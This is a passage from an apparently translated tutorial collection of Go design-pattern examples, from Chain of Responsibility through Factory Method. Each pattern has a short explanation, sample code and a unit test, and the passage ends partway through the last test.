func (h *ConcreteHandlerA) SendRequest(message int) (result string) {
  if message == 1 {
    result = "Im handler 1"
  } else if h.next != nil {
    result = h.next.SendRequest(message)
  }
  return
}
// ConcreteHandlerB implements handler "B".
type ConcreteHandlerB struct {
  next Handler
}
// SendRequest implementation.
func (h *ConcreteHandlerB) SendRequest(message int) (result string) {
  if message == 2 {
    result = "Im handler 2"
  } else if h.next != nil {
    result = h.next.SendRequest(message)
  }
  return
}
// ConcreteHandlerC implements handler "C".
type ConcreteHandlerC struct {
  next Handler
}
// SendRequest implementation.
func (h *ConcreteHandlerC) SendRequest(message int) (result string) {
  if message == 3 {
    result = "Im handler 3"
  } else if h.next != nil {
    result = h.next.SendRequest(message)
  }
  return
}

func TestChainOfResponsibility(t *testing.T) {
  expect := "Im handler 2"
  handlers := &ConcreteHandlerA{
    next: &ConcreteHandlerB{
      next: &ConcreteHandlerC{},
    },
  }
  result := handlers.SendRequest(2)
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Command
(tags: pattern command)
---

https://github.com/AlexanderGrom/go-patterns

The Command pattern refers to object-level behavioral patterns.

The Command pattern allows you to represent a request as an object. It follows that a command is an object. Such requests, for example, can be queued, canceled, or resumed.

In this pattern, we operate with the following concepts:
Command - a request in the form of an object for execution;
Receiver - a request receiver object that will process our command;
Invoker is the requestor object.

The Command pattern decouples the object that initiates an operation from the object that knows how to perform it. The only thing the initiator needs to know is how to send the command.

Required for implementation:

1. Basic abstract class Command describing the command interface;
2. The ConcreteCommand class that implements the command;
3. The Invoker class, which implements the initiator, writes the command and provokes its execution;
4. The Receiver class, which implements the receiver and has a set of actions that the command can request;

Invoker knows how to stack commands and initiate their execution by some event. By contacting Invoker, you can cancel the command while it is not completed.

The ConcreteCommand contains the requests to the Receiver that it must execute. In turn, Receiver contains only a set of Actions that are executed when they are called from the ConcreteCommand.

package command

// Command provides a command interface.
type Command interface {
  Execute() string
}
// ToggleOnCommand implements the Command interface.
type ToggleOnCommand struct {
  receiver *Receiver
}
// Execute command.
func (c *ToggleOnCommand) Execute() string {
  return c.receiver.ToggleOn()
}
// ToggleOffCommand implements the Command interface.
type ToggleOffCommand struct {
  receiver *Receiver
}
// Execute command.
func (c *ToggleOffCommand) Execute() string {
  return c.receiver.ToggleOff()
}
// Receiver implementation.
type Receiver struct {
}
// ToggleOn implementation.
func (r *Receiver) ToggleOn() string {
  return "Toggle On"
}
// ToggleOff implementation.
func (r *Receiver) ToggleOff() string {
  return "Toggle Off"
}
// Invoker implementation.
type Invoker struct {
  commands []Command
}
// StoreCommand adds command.
func (i *Invoker) StoreCommand(command Command) {
  i.commands = append(i.commands, command)
}
// UnStoreCommand removes command.
func (i *Invoker) UnStoreCommand() {
  if len(i.commands) != 0 {
    i.commands = i.commands[:len(i.commands)-1]
  }
}
// Execute all commands.
func (i *Invoker) Execute() string {
  var result string
  for _, command := range i.commands {
    result += command.Execute() + "\n"
  }
  return result
}

func TestCommand(t *testing.T) {
  expect := "Toggle On\n" +
    "Toggle Off\n"
  invoker := &Invoker{}
  receiver := &Receiver{}
  invoker.StoreCommand(&ToggleOnCommand{receiver: receiver})
  invoker.StoreCommand(&ToggleOffCommand{receiver: receiver})
  result := invoker.Execute()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Iterator
(tags: pattern iterator)
---

https://github.com/AlexanderGrom/go-patterns

The Iterator pattern refers to object-level behavioral patterns.

The Iterator pattern provides a mechanism for traversing collections of objects without exposing their internal representation.

Often this pattern is used instead of an array of objects to not only provide access to elements, but also to provide some logic.

Iterator is a generic interface that allows you to implement arbitrary iteration logic.

Required for implementation:

1. The Iterator interface describing a set of methods for accessing the collection;
2. The ConcreteIterator class that implements the Iterator interface. Keeps track of the position of the current element while iterating over the collection (Aggregate) .;
3. Interface Aggregate describing a set of methods for a collection of objects;
4. The ConcreteAggregate class that implements the Aggregate interface and stores the elements of the collection.

package iterator

// Iterator provides a iterator interface.
type Iterator interface {
  Index() int
  Value() interface{}
  Has() bool
  Next()
  Prev()
  Reset()
  End()
}
// Aggregate provides a collection interface.
type Aggregate interface {
  Iterator() Iterator
}
// BookIterator implements the Iterator interface.
type BookIterator struct {
  shelf    *BookShelf
  index    int
  internal int
}
// Index returns current index
func (i *BookIterator) Index() int {
  return i.index
}
// Value returns current value
func (i *BookIterator) Value() interface{} {
  return i.shelf.Books[i.index]
}
// Has implementation.
func (i *BookIterator) Has() bool {
  if i.internal < 0 || i.internal >= len(i.shelf.Books) {
    return false
  }
  return true
}
// Next goes to the next item.
func (i *BookIterator) Next() {
  i.internal++
  if i.Has() {
    i.index++
  }
}
// Prev goes to the previous item.
func (i *BookIterator) Prev() {
  i.internal--
  if i.Has() {
    i.index--
  }
}
// Reset resets iterator.
func (i *BookIterator) Reset() {
  i.index = 0
  i.internal = 0
}
// End goes to the last item.
func (i *BookIterator) End() {
  i.index = len(i.shelf.Books) - 1
  i.internal = i.index
}
// BookShelf implements the Aggregate interface.
type BookShelf struct {
  Books []*Book
}
// Iterator creates and returns the iterator over the collection.
func (b *BookShelf) Iterator() Iterator {
  return &BookIterator{shelf: b}
}
// Add adds an item to the collection.
func (b *BookShelf) Add(book *Book) {
  b.Books = append(b.Books, book)
}
// Book implements a item of the collection.
type Book struct {
  Name string
}

func TestIterator(t *testing.T) {
  shelf := new(BookShelf)
  books := []string{"A", "B", "C", "D", "E", "F"}
  for _, book := range books {
    shelf.Add(&Book{Name: book})
  }
  for iterator := shelf.Iterator(); iterator.Has(); iterator.Next() {
    index, value := iterator.Index(), iterator.Value().(*Book)
    if value.Name != books[index] {
      t.Errorf("Expect Book.Name to %s, but %s", books[index], value.Name)
    }
  }
}
==================================================
Pattern Mediator
(tags: pattern mediator)
---

https://github.com/AlexanderGrom/go-patterns

The Mediator pattern refers to object-level behavioral patterns.

The Mediator pattern provides a mediation object that hides the way many other peer objects interact. Mediator makes the system loosely coupled, eliminating the need for objects to refer to each other, which allows you to change the interaction between them independently.

For example, we have an intermediary between a bakery factory, a farmer and a distribution store. The intermediary relieves the farmer from interacting with the plant, which uses his raw materials, and the plant from interacting with the store, which receives the products for sale.

Required for implementation:

1. Interface Mediator - a mediator describing the organization of the process of exchanging information between objects of the Colleague type;
2. The ConcreteMediator class that implements the Mediator interface;
3. The base abstract class Colleague is a colleague describing the organization of the process of interaction of colleague objects with an object of Mediator type;
4. The ConcreteColleague class that implements the Colleague interface. Each peer object only knows about the mediator object. All peer objects exchange information only through an intermediary.

package mediator

// Mediator provides a mediator interface.
type Mediator interface {
  Notify(msg string)
}
// Тип ConcreteMediator, реализует посредника
type ConcreteMediator struct {
  *Farmer
  *Cannery
  *Shop
}
// Notify implementation.
func (m *ConcreteMediator) Notify(msg string) {
  if msg == "Farmer: Tomato complete..." {
    m.Cannery.AddMoney(-15000.00)
    m.Farmer.AddMoney(15000.00)
    m.Cannery.MakeKetchup(m.Farmer.GetTomato())
  } else if msg == "Cannery: Ketchup complete..." {
    m.Shop.AddMoney(-30000.00)
    m.Cannery.AddMoney(30000.00)
    m.Shop.SellKetchup(m.Cannery.GetKetchup())
  }
}
// СonnectСolleagues connects all colleagues.
func СonnectСolleagues(farmer *Farmer, cannery *Cannery, shop *Shop) {
  mediator := &ConcreteMediator{
    Farmer:  farmer,
    Cannery: cannery,
    Shop:    shop,
  }
  mediator.Farmer.SetMediator(mediator)
  mediator.Cannery.SetMediator(mediator)
  mediator.Shop.SetMediator(mediator)
}
// Farmer implements a Farmer colleague
type Farmer struct {
  mediator Mediator
  tomato   int
  money    float64
}
// SetMediator sets mediator.
func (f *Farmer) SetMediator(mediator Mediator) {
  f.mediator = mediator
}
// AddMoney adds money.
func (f *Farmer) AddMoney(m float64) {
  f.money += m
}
// GrowTomato implementation.
func (f *Farmer) GrowTomato(tomato int) {
  f.tomato = tomato
  f.money -= 7500.00
  f.mediator.Notify("Farmer: Tomato complete...")
}
// GetTomato returns tomatos.
func (f *Farmer) GetTomato() int {
  return f.tomato
}
// Cannery implements a Cannery colleague.
type Cannery struct {
  mediator Mediator
  ketchup  int
  money    float64
}
// SetMediator sets mediator.
func (c *Cannery) SetMediator(mediator Mediator) {
  c.mediator = mediator
}
// AddMoney adds money.
func (c *Cannery) AddMoney(m float64) {
  c.money += m
}
// MakeKetchup implementation.
func (c *Cannery) MakeKetchup(tomato int) {
  c.ketchup = tomato
  c.mediator.Notify("Cannery: Ketchup complete...")
}
// GetKetchup returns ketchup.
func (c *Cannery) GetKetchup() int {
  return c.ketchup
}
// Shop implements a Shop colleague.
type Shop struct {
  mediator Mediator
  money    float64
}
// SetMediator sets mediator.
func (s *Shop) SetMediator(mediator Mediator) {
  s.mediator = mediator
}
// AddMoney adds money.
func (s *Shop) AddMoney(m float64) {
  s.money += m
}
// SellKetchup converts ketchup to money.
func (s *Shop) SellKetchup(ketchup int) {
  s.money = float64(ketchup) * 54.75
}
// GetMoney returns money.
func (s *Shop) GetMoney() float64 {
  return s.money
}

func TestMediator(t *testing.T) {
  farmer := new(Farmer)
  cannery := new(Cannery)
  shop := new(Shop)
  farmer.AddMoney(7500.00)
  cannery.AddMoney(15000.00)
  shop.AddMoney(30000.00)
  СonnectСolleagues(farmer, cannery, shop)
  // A farmer grows a 1000kg tomato
  // and informs the mediator about the completion of his work.
  // Next, the mediator sends the tomatoes to the cannery.
  // After the cannery produces 1000 packs of ketchup,
  // he informs the mediator about his delivery to the store.
  farmer.GrowTomato(1000)
  expect := float64(54750)
  result := shop.GetMoney()
  if result != expect {
    t.Errorf("Expect result to equal %f, but %f.\n", expect, result)
  }
}
==================================================
Pattern Memento
(tags: pattern memento)
---

https://github.com/AlexanderGrom/go-patterns

The Memento pattern refers to object-level behavioral patterns.

The Memento pattern gets and stores its internal state outside of an object so that it can be restored to the same state later. If the client later needs to "roll back" the state of the original object, it passes the Memento back to the original object to restore it.

The pattern operates on three objects:

1. The owner of the state (Originator);
2. Keeper (Memento) - Stores the state of the object-owner of the Originator class;
3. Caretaker - Responsible for the safety of the custodian object of the Memento class.

Required for implementation:

1. The Originator class, which has some kind of changing state, and also it can create and accept keepers (Memento) of its state;
2. The Memento class, implements the storage for the Originator state;
3. The Caretaker class, receives and stores a Memento object until the owner needs it.

package memento
// Originator implements a state master.
type Originator struct {
  State string
}
// CreateMemento returns state storage.
func (o *Originator) CreateMemento() *Memento {
  return &Memento{state: o.State}
}
// SetMemento sets old state.
func (o *Originator) SetMemento(memento *Memento) {
  o.State = memento.GetState()
}
// Memento implements storage for the state of Originator
type Memento struct {
  state string
}
// GetState returns state.
func (m *Memento) GetState() string {
  return m.state
}
// Caretaker keeps Memento until it is needed by Originator.
type Caretaker struct {
  Memento *Memento
}

func TestMomento(t *testing.T) {
  originator := new(Originator)
  caretaker := new(Caretaker)
  originator.State = "On"
  caretaker.Memento = originator.CreateMemento()
  originator.State = "Off"
  originator.SetMemento(caretaker.Memento)
  if originator.State != "On" {
    t.Errorf("Expect State to %s, but %s", originator.State, "On")
  }
}
==================================================
Pattern Observer
(tags: pattern observer)
---

https://github.com/AlexanderGrom/go-patterns

The Observer pattern refers to object-level behavioral patterns.

The Observer pattern defines a one-to-many dependency between objects so that when the state of one object changes, all objects that depend on it are notified and automatically updated.

The main participants in the pattern are Subject and Observer.

There are two ways to receive notifications from the publisher:

1. Pull method: After receiving a notification from the publisher, the subscriber must go to the publisher and retrieve (pull) the data himself.
2. Push method: The publisher does not notify the subscriber of data updates, but independently delivers (pushes) the data to the subscriber.

Required for implementation:

1. Abstract class Subject that defines the Publisher interface;
2. The ConcreteSubject class, implements the Subject interface;
3. An abstract class Observer that defines the general functionality of Subscribers;
4. Class ConcreteObserver, implements Subscriber;

package observer

// Publisher interface.
type Publisher interface {
  Attach(observer Observer)
  SetState(state string)
  Notify()
}
// Observer provides a subscriber interface.
type Observer interface {
  Update(state string)
}
// ConcretePublisher implements the Publisher interface.
type ConcretePublisher struct {
  observers []Observer
  state     string
}
// NewPublisher is the Publisher constructor.
func NewPublisher() Publisher {
  return &ConcretePublisher{}
}
// Attach a Observer
func (s *ConcretePublisher) Attach(observer Observer) {
  s.observers = append(s.observers, observer)
}
// SetState sets new state
func (s *ConcretePublisher) SetState(state string) {
  s.state = state
}
// Notify sends notifications to subscribers.
// Push model.
func (s *ConcretePublisher) Notify() {
  for _, observer := range s.observers {
    observer.Update(s.state)
  }
}
// ConcreteObserver implements the Observer interface.
type ConcreteObserver struct {
  state string
}
// Update set new state
func (s *ConcreteObserver) Update(state string) {
  s.state = state
}

func ExampleObserver() {
  publisher := NewPublisher()
  publisher.Attach(&ConcreteObserver{})
  publisher.Attach(&ConcreteObserver{})
  publisher.Attach(&ConcreteObserver{})
  publisher.SetState("New State...")
  publisher.Notify()
}
==================================================
Pattern State
(tags: pattern state)
---

https://github.com/AlexanderGrom/go-patterns

The State pattern refers to object-level behavioral patterns.

The State pattern allows an object to change its behavior based on internal state and is an object-oriented implementation of a state machine. The behavior of the object changes so much that it looks like the class of the object has changed.

The pattern should be applied when the behavior of an object depends on its state and it must change during program execution, provided that there are a lot of states and it is rather difficult to use conditional operators scattered throughout the code for this.

Required for implementation:

1. The Context class is an object-oriented representation of a state machine;
2. Abstract class State, which defines the interface of various states;
3. Class ConcreteStateA, implements one of the behaviors associated with a specific state;
4. The ConcreteStateB class implements one of the behaviors associated with a specific state.

package state

// MobileAlertStater provides a common interface for various states.
type MobileAlertStater interface {
  Alert() string
}
// MobileAlert implements an alert depending on its state.
type MobileAlert struct {
  state MobileAlertStater
}
// Alert returns a alert string
func (a *MobileAlert) Alert() string {
  return a.state.Alert()
}
// SetState changes state
func (a *MobileAlert) SetState(state MobileAlertStater) {
  a.state = state
}
// NewMobileAlert is the MobileAlert constructor.
func NewMobileAlert() *MobileAlert {
  return &MobileAlert{state: &MobileAlertVibration{}}
}
// MobileAlertVibration implements vibration alert
type MobileAlertVibration struct {
}
// Alert returns a alert string
func (a *MobileAlertVibration) Alert() string {
  return "Vrrr... Brrr... Vrrr..."
}
// MobileAlertSong implements beep alert
type MobileAlertSong struct {
}
// Alert returns a alert string
func (a *MobileAlertSong) Alert() string {
  return "Белые розы, Белые розы. Беззащитны шипы..."
}

func TestState(t *testing.T) {
  expect := "Vrrr... Brrr... Vrrr..." +
    "Vrrr... Brrr... Vrrr..." +
    "Белые розы, Белые розы. Беззащитны шипы..."
  mobile := NewMobileAlert()
  result := mobile.Alert()
  result += mobile.Alert()
  mobile.SetState(&MobileAlertSong{})
  result += mobile.Alert()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Strategy
(tags: pattern strategy)
---

https://github.com/AlexanderGrom/go-patterns

The Strategy pattern refers to object-level behavioral patterns.

The Strategy pattern defines a set of algorithms that are similar in nature, encapsulates them in a separate class and makes them replaceable. The Strategy pattern allows algorithms to be substituted without the involvement of clients using these algorithms.

Required for implementation:

1. The Context class, which is the context for the execution of a particular strategy;
2. Abstract class Strategy, which defines the interface of various strategies;
3. The ConcreteStrategyA class implements one of the strategies, which are algorithms aimed at achieving a specific goal;
4. The ConcreteStrategyB class implements one of the strategies, which are algorithms aimed at achieving a specific goal.

package strategy

// StrategySort provides an interface for sort algorithms.
type StrategySort interface {
  Sort([]int)
}
// BubbleSort implements bubble sort algorithm.
type BubbleSort struct {
}
// Sort sorts data.
func (s *BubbleSort) Sort(a []int) {
  size := len(a)
  if size < 2 {
    return
  }
  for i := 0; i < size; i++ {
    for j := size - 1; j >= i+1; j-- {
      if a[j] < a[j-1] {
        a[j], a[j-1] = a[j-1], a[j]
      }
    }
  }
}
// InsertionSort implements insertion sort algorithm.
type InsertionSort struct {
}
// Sort sorts data.
func (s *InsertionSort) Sort(a []int) {
  size := len(a)
  if size < 2 {
    return
  }
  for i := 1; i < size; i++ {
    var j int
    var buff = a[i]
    for j = i - 1; j >= 0; j-- {
      if a[j] < buff {
        break
      }
      a[j+1] = a[j]
    }
    a[j+1] = buff
  }
}
// Context provides a context for execution of a strategy.
type Context struct {
  strategy StrategySort
}
// Algorithm replaces strategies.
func (c *Context) Algorithm(a StrategySort) {
  c.strategy = a
}
// Sort sorts data according to the chosen strategy.
func (c *Context) Sort(s []int) {
  c.strategy.Sort(s)
}

func TestStrategy(t *testing.T) {
  data1 := []int{8, 2, 6, 7, 1, 3, 9, 5, 4}
  data2 := []int{8, 2, 6, 7, 1, 3, 9, 5, 4}
  ctx := new(Context)
  ctx.Algorithm(&BubbleSort{})
  ctx.Sort(data1)
  ctx.Algorithm(&InsertionSort{})
  ctx.Sort(data2)
  expect := "1,2,3,4,5,6,7,8,9,"
  var result1 string
  for _, val := range data1 {
    result1 += strconv.Itoa(val) + ","
  }
  if result1 != expect {
    t.Errorf("Expect result1 to equal %s, but %s.\n", expect, result1)
  }
  var result2 string
  for _, val := range data2 {
    result2 += strconv.Itoa(val) + ","
  }
  if result2 != expect {
    t.Errorf("Expect result2 to equal %s, but %s.\n", expect, result2)
  }
}
==================================================
Pattern Template Method
(tags: pattern template method)
---

https://github.com/AlexanderGrom/go-patterns

The Template Method pattern refers to class-level behavioral patterns.

The Template Method pattern forms the structure of the algorithm and allows derived classes to implement, override or override certain steps of the algorithm without changing the structure of the algorithm as a whole.

The designer decides which steps of the algorithm are immutable and which are mutable. An abstract base class implements standard immutable steps in the algorithm, and can provide a default implementation for mutable steps. Modifiable steps can be provided by the client of the component in concrete derived classes.

Required for implementation:

1. An abstract class AbstractClass that implements the Template Method, which describes the order of actions;
2. Class ConcreteClass, which implements mutable actions.

package template_method

// QuotesInterface provides an interface for setting different quotes.
type QuotesInterface interface {
  Open() string
  Close() string
}
// Quotes implements a Template Method.
type Quotes struct {
  QuotesInterface
}
// Quotes is the Template Method.
func (q *Quotes) Quotes(str string) string {
  return q.Open() + str + q.Close()
}
// NewQuotes is the Quotes constructor.
func NewQuotes(qt QuotesInterface) *Quotes {
  return &Quotes{qt}
}
// FrenchQuotes implements wrapping the string in French quotes.
type FrenchQuotes struct {
}
// Open sets opening quotes.
func (q *FrenchQuotes) Open() string {
  return "«"
}
// Close sets closing quotes.
func (q *FrenchQuotes) Close() string {
  return "»"
}
// GermanQuotes implements wrapping the string in German quotes.
type GermanQuotes struct {
}
// Open sets opening quotes.
func (q *GermanQuotes) Open() string {
  return "„"
}
// Close sets closing quotes.
func (q *GermanQuotes) Close() string {
  return "“"
}

func TestTemplateMethod(t *testing.T) {
  expect := "«Test String»"
  qt := NewQuotes(&FrenchQuotes{})
  result := qt.Quotes("Test String")
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Visitor
(tags: pattern visitor)
---

https://github.com/AlexanderGrom/go-patterns

The Visitor pattern refers to object-level behavioral patterns.

The Visitor pattern allows you to bypass a set of elements (objects) with heterogeneous interfaces, and also allows you to add a new method to an object class without changing the class of this object itself.

Required for implementation:

1. Abstract class Visitor describing the visitor interface;
2. The ConcreteVisitor class that implements a specific visitor. Implements methods to traverse a specific element;
3. The ObjectStructure class, which implements the structure (collection) in which the elements to be traversed are stored;
4. Abstract class Element, which implements the interface of structure elements;
5. The ElementA class that implements the structure element;
6. The ElementB class that implements the structure element.

package visitor

// Visitor provides a visitor interface.
type Visitor interface {
  VisitSushiBar(p *SushiBar) string
  VisitPizzeria(p *Pizzeria) string
  VisitBurgerBar(p *BurgerBar) string
}
// Place provides an interface for place that the visitor should visit.
type Place interface {
  Accept(v Visitor) string
}
// People implements the Visitor interface.
type People struct {
}
// VisitSushiBar implements visit to SushiBar.
func (v *People) VisitSushiBar(p *SushiBar) string {
  return p.BuySushi()
}
// VisitPizzeria implements visit to Pizzeria.
func (v *People) VisitPizzeria(p *Pizzeria) string {
  return p.BuyPizza()
}
// VisitBurgerBar implements visit to BurgerBar.
func (v *People) VisitBurgerBar(p *BurgerBar) string {
  return p.BuyBurger()
}
// City implements a collection of places to visit.
type City struct {
  places []Place
}
// Add appends Place to the collection.
func (c *City) Add(p Place) {
  c.places = append(c.places, p)
}
// Accept implements a visit to all places in the city.
func (c *City) Accept(v Visitor) string {
  var result string
  for _, p := range c.places {
    result += p.Accept(v)
  }
  return result
}
// SushiBar implements the Place interface.
type SushiBar struct {
}
// Accept implementation.
func (s *SushiBar) Accept(v Visitor) string {
  return v.VisitSushiBar(s)
}
// BuySushi implementation.
func (s *SushiBar) BuySushi() string {
  return "Buy sushi..."
}
// Pizzeria implements the Place interface.
type Pizzeria struct {
}
// Accept implementation.
func (p *Pizzeria) Accept(v Visitor) string {
  return v.VisitPizzeria(p)
}
// BuyPizza implementation.
func (p *Pizzeria) BuyPizza() string {
  return "Buy pizza..."
}
// BurgerBar implements the Place interface.
type BurgerBar struct {
}
// Accept implementation.
func (b *BurgerBar) Accept(v Visitor) string {
  return v.VisitBurgerBar(b)
}
// BuyBurger implementation.
func (b *BurgerBar) BuyBurger() string {
  return "Buy burger..."
}

func TestVisitor(t *testing.T) {
  expect := "Buy sushi...Buy pizza...Buy burger..."
  city := new(City)
  city.Add(&SushiBar{})
  city.Add(&Pizzeria{})
  city.Add(&BurgerBar{})
  result := city.Accept(&People{})
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Abstract Factory
(tags: pattern abstract factory)
---

https://github.com/AlexanderGrom/go-patterns

The Abstract Factory pattern refers to object-level generative patterns.

The Abstract Factory pattern provides a common interface for creating a family of related objects. This allows you to separate the functionality of the system from the internal implementation of each class, and access to these classes becomes possible through abstract interfaces.

In general, an abstract factory looks like this. For each of the families of objects, a concrete factory is created (heir to the abstract one), through which the products of this family are created.

Example: There are two soda factories, Coca-Cola and Pepsi. These factories produce a family of products (objects) - bottle, cap, label, liquid. Each of these factories produces products that interact with each other and cannot live separately from each other. The Coca-Cola Factory cannot supply empty bottles to customers.

To implement a simple creation of a family of objects, there must be an interface on which the factory operates, and the factory must also release products with a specific interface. For example, the bottles of both companies have the same interface - they have a neck through which they are filled with liquid, we can also find out the volume of the bottles. Further, the bottles may differ in shape, volume or material, this does not concern us, we only need to know where to pour the liquid, as well as how much of this liquid is needed.

Required for implementation:

1. The class of abstract factory AbstractFactory, which describes the general interface of the factory, from which each concrete factory will inherit;
2. The abstract product class AbstractProduct, which describes the general product interface from which each specific product will inherit;
3. The class of a specific factory Factory;
4. The class of a specific product ProductA.
5. The class of a specific product ProductB.

An abstract factory is a base class that describes the interface of concrete factories that create products. Concrete factory classes derived from it must implement this interface.

Also, an abstract factory should describe the abstract products that it produces, so that concrete factories would produce products with the necessary interfaces.

package abstract_factory

// AbstractFactory provides an interface for creating families of related objects.
type AbstractFactory interface {
  CreateWater(volume float64) AbstractWater
  CreateBottle(volume float64) AbstractBottle
}
// AbstractWater provides a water interface.
type AbstractWater interface {
  GetVolume() float64
}
// AbstractBottle provides a bottle interface.
type AbstractBottle interface {
  PourWater(water AbstractWater) // Bottle interacts with a water.
  GetBottleVolume() float64
  GetWaterVolume() float64
}
// CocaColaFactory implements AbstractFactory interface.
type CocaColaFactory struct {
}
// NewCocaColaFactory is the CocaColaFactory constructor.
func NewCocaColaFactory() AbstractFactory {
  return &CocaColaFactory{}
}
// CreateWater implementation.
func (f *CocaColaFactory) CreateWater(volume float64) AbstractWater {
  return &CocaColaWater{volume: volume}
}
// CreateBottle implementation.
func (f *CocaColaFactory) CreateBottle(volume float64) AbstractBottle {
  return &CocaColaBottle{volume: volume}
}
// CocaColaWater implements AbstractWater.
type CocaColaWater struct {
  volume float64 // Volume of drink.
}
// GetVolume returns volume of drink.
func (w *CocaColaWater) GetVolume() float64 {
  return w.volume
}
// CocaColaBottle implements AbstractBottle.
type CocaColaBottle struct {
  water  AbstractWater // Bottle must contain a drink.
  volume float64       // Volume of bottle.
}
// PourWater pours water into a bottle.
func (b *CocaColaBottle) PourWater(water AbstractWater) {
  b.water = water
}
// GetBottleVolume returns volume of bottle.
func (b *CocaColaBottle) GetBottleVolume() float64 {
  return b.volume
}
// GetWaterVolume returns volume of water.
func (b *CocaColaBottle) GetWaterVolume() float64 {
  return b.water.GetVolume()
}

func TestAbstractFactory(t *testing.T) {
  cocacolaFactory := NewCocaColaFactory()
  cocacolaWater := cocacolaFactory.CreateWater(2.5)
  cocacolaBottle := cocacolaFactory.CreateBottle(2.5)
  cocacolaBottle.PourWater(cocacolaWater)
  if cocacolaBottle.GetWaterVolume() != cocacolaBottle.GetBottleVolume() {
    t.Errorf("Expect volume to %.1fL, but %.1fL", cocacolaBottle.GetWaterVolume(), cocacolaBottle.GetBottleVolume())
  }
}
==================================================
Pattern Builder
(tags: pattern builder)
---

https://github.com/AlexanderGrom/go-patterns

The Builder pattern is one of the object-level generative patterns.

The Builder pattern defines a step-by-step process for building a complex product. After the last part is built, the product can be used.

In the example of the Abstract Factory pattern, the example of two factories Coca-Cola and Percy was given. Take one factory, it produces a complex product with 4 parts (cap, bottle, label, drink) that must be applied in the right order. You cannot first take the lid, bottle, screw on the lid, and then try to pour a drink there. To implement an object, a bottle of Coca-Cola that is supplied to a client, we need a Builder pattern.

It is important to understand that a complex object is not necessarily an object that operates with several other objects in the sense of OOP. For example, we need to get a document consisting of a title, introduction, content and conclusion. Our document is a complex object. We will use the Builder pattern to create a unified document compilation order.

Required for implementation:

1. Class Director, which will manage the builder and give him commands in the right order, and the builder will execute them;
2. The base abstract class Builder, which describes the interface of the builder, the commands that he must execute;
3. The ConcreteBuilder class, which implements the builder interface and interacts with a complex object;
4. The class of the complex object Product.

package builder

// Builder provides a builder interface.
type Builder interface {
  MakeHeader(str string)
  MakeBody(str string)
  MakeFooter(str string)
}
// Director implements a manager
type Director struct {
  builder Builder
}
// Construct tells the builder what to do and in what order.
func (d *Director) Construct() {
  d.builder.MakeHeader("Header")
  d.builder.MakeBody("Body")
  d.builder.MakeFooter("Footer")
}
// ConcreteBuilder implements Builder interface.
type ConcreteBuilder struct {
  product *Product
}
// MakeHeader builds a header of document..
func (b *ConcreteBuilder) MakeHeader(str string) {
  b.product.Content += "<header>" + str + "</header>"
}
// MakeBody builds a body of document.
func (b *ConcreteBuilder) MakeBody(str string) {
  b.product.Content += "<article>" + str + "</article>"
}
// MakeFooter builds a footer of document.
func (b *ConcreteBuilder) MakeFooter(str string) {
  b.product.Content += "<footer>" + str + "</footer>"
}
// Product implementation.
type Product struct {
  Content string
}
// Show returns product.
func (p *Product) Show() string {
  return p.Content
}

func TestBuilder(t *testing.T) {
  expect := "<header>Header</header>" +
    "<article>Body</article>" +
    "<footer>Footer</footer>"
  product := new(Product)
  director := Director{&ConcreteBuilder{product}}
  director.Construct()
  result := product.Show()
  if result != expect {
    t.Errorf("Expect result to %s, but %s", result, expect)
  }
}
==================================================
Pattern Factory Method
(tags: pattern factory method)
---

https://github.com/AlexanderGrom/go-patterns

The Factory Method pattern refers to class-level generative patterns and focuses only on relationships between classes.

The Factory Method pattern is useful when the system must remain easily extensible by adding new types of objects. This pattern is the basis for all generative patterns and can be easily transformed to suit the needs of the system. Therefore, if the developer is faced with unclear requirements for the product or the way of organizing interaction between products is not clear, then first you can use the Factory Method pattern until all the requirements are fully formed.

The Factory Method pattern is used to create objects with a specific interface, which are provided by descendants. In other words, there is a base abstract factory class that says that each inheriting factory must implement such and such a method to create its products.

The implementation of the factory method can be different, in most cases it depends on the implementation language. It can be polymorphism or a parameterized method.

Example: We receive files of three extensions .txt, .png, .doc. Depending on the file extension, we have to save it in one of the directories / file / txt /, / file / png / and / file / doc /. This means that we will have a file factory with a parameterized factory method that accepts the path to a file that we need to store in one of the directories. This factory method returns an object to us, using which we can manipulate our file (save, see the type and directory for saving). Note that we do not specify in any way which instance of the product object we need to get, this is done by the factory method by determining the file extension and, based on it, choosing the appropriate product class. Thus, if our system expands and the available file extensions become, for example, 25, then we just need to change the factory method and implement the product classes.

Required for implementation:

1. The basic abstract class Creator, which describes the interface that a specific factory must implement to produce products. This base class describes a factory method.
2. The base Product class, which describes the product interface returned by the factory. All products returned by the factory must adhere to the same interface.
3. The class of a specific factory for the production of ConcreteCreator products. This class must implement a factory method;
4. Class of the real product ConcreteProductA;
5. The class of the real product ConcreteProductB;
6. The class of the real product ConcreteProductC.

Factory Method differs from Abstract Factory in that Abstract Factory produces a family of objects, these objects are different, have different interfaces, but interact with each other. While Factory Method produces products that adhere to the same interface and these products are not interconnected, they do not interact.

package factory_method

import "log"

// Creater provides a factory interface.
type Creater interface {
  CreateProduct(action string) Producter // Factory Method
}
// Producter provides a product interface.
// All products returned by factory must provide a single interface.
type Producter interface {
  Use() string // Every product should be can be used
}
// ConcreteCreater implements Creater interface.
type ConcreteCreater struct {
}
// NewCreater is the ConcreteCreater constructor.
func NewCreater() Creater {
  return &ConcreteCreater{}
}
// CreateProduct is a Factory Method
func (p *ConcreteCreater) CreateProduct(action string) Producter {
  var product Producter
  switch action {
  case "A":
    product = &ConcreteProductA{action}
  case "B":
    product = &ConcreteProductB{action}
  case "C":
    product = &ConcreteProductC{action}
  default:
    log.Fatalln("Unknown Action")
  }
  return product
}
// ConcreteProductA implements product "A"
type ConcreteProductA struct {
  action string
}
// Use returns product action
func (p *ConcreteProductA) Use() string {
  return p.action
}
// ConcreteProductB implements product "B"
type ConcreteProductB struct {
  action string
}
// Use returns product action
func (p *ConcreteProductB) Use() string {
  return p.action
}
// ConcreteProductC implements product "C"
type ConcreteProductC struct {
  action string
}
// Use returns product action
func (p *ConcreteProductC) Use() string {
  return p.action
}

func TestFactoryMethod(t *testing.T) {
  assert := []string{"A", "B", "C"}
  factory := NewCreater()
  products := []Producter{
    factory.CreateProduct("A"),
    factory.CreateProduct("B"),
